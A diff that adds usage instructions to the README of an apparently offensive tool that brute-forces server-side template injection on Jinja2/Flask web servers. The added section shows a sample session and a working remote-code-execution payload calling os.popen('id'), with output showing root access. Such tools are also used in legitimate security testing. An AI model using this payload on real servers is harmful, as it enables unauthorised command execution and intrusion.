@@ -23,7 +23,32 @@ It works by injecting multiple crafted payloads and analyzing server responses t
 - Uses `pycurl` for fast and raw HTTP requests
 
 ---
+## How to use
+This is an example of use:
+```bash
+> python3 ice-ice-tea-ay.py
 
+Ice-Ice-Tea-Ay!
+A Brute-Force Tool to check SSTI vulnerability on Jinja2/Flask-based web servers.
+
+Please put the URL target here: http://localhost:5000/login
+Insert a header body (place '&x' inside the body): username=admin&password=&x
+1. Number eval check 
+2. Remote Code Execution (RCE) check 
+3. Check all possible code 
+Choose a number: 3
+```
+If the tools success find the payload, the output will look like this:
+```bash
+Found One!
+Payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+Response:
+
+                <!doctype html>
+                <h1 style="font-size:100px;" align="center">uid=0(root) gid=0(root) groups=0(root)     
+</h1>
+```
+---
 ## Installation
 
 ```bash
